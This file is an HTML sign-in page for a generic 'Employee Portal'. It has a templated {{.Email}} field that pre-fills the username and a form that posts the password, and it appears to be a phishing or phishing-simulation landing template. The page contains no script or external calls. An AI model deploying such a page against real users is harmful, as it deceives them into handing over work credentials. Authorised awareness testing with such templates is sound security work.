<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Verification Required</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: #ffffff;
            border: 1px solid #d0d0d0;
            border-radius: 4px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            padding: 48px;
            max-width: 400px;
            width: 100%;
        }
        .logo {
            text-align: center;
            margin-bottom: 32px;
        }
        .logo-text {
            font-size: 28px;
            font-weight: 600;
            color: #0066cc;
        }
        h1 {
            color: #1a1a1a;
            text-align: center;
            margin-bottom: 16px;
            font-size: 24px;
            font-weight: 600;
        }
        .subtitle {
            color: #606060;
            text-align: center;
            margin-bottom: 32px;
            font-size: 14px;
            line-height: 1.5;
        }
        .alert {
            background-color: #fff3cd;
            border: 1px solid #ffc107;
            color: #856404;
            padding: 12px 16px;
            border-radius: 4px;
            margin-bottom: 24px;
            font-size: 14px;
            line-height: 1.5;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #1a1a1a;
            font-weight: 500;
            font-size: 14px;
        }
        input[type="text"],
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #d0d0d0;
            border-radius: 4px;
            font-size: 14px;
            transition: border-color 0.2s;
            background-color: #ffffff;
        }
        input[type="text"]:focus,
        input[type="email"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #0066cc;
            box-shadow: 0 0 0 3px rgba(0,102,204,0.1);
        }
        .btn {
            width: 100%;
            background-color: #0066cc;
            color: #ffffff;
            padding: 12px 16px;
            border: none;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-top: 8px;
        }
        .btn:hover {
            background-color: #0052a3;
        }
        .btn:active {
            background-color: #004182;
        }
        .footer {
            text-align: center;
            margin-top: 32px;
            font-size: 12px;
            color: #909090;
            line-height: 1.5;
        }
        .footer a {
            color: #0066cc;
            text-decoration: none;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        @media (max-width: 480px) {
            .container {
                padding: 32px 24px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <div class="logo-text">Employee Portal</div>
        </div>

        <h1>Sign in</h1>

        <div class="subtitle">
            Sign in with your work account to continue.
        </div>

        <form method="POST" action="">
            <div class="form-group">
                <label for="username">Email or username</label>
                <input type="text" id="username" name="username" value="{{.Email}}" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>

            <button type="submit" class="btn">Sign in</button>
        </form>

        <div class="footer">
            <p>Need help signing in? Contact your IT Service Desk.</p>
            <p style="margin-top: 16px;">
                <a href="/privacy">Privacy Policy</a> &bull; <a href="/terms">Terms of Use</a>
            </p>
            <p style="margin-top: 12px;">© 2026 Employee Portal. All rights reserved.</p>
        </div>
    </div>
</body>
</html>
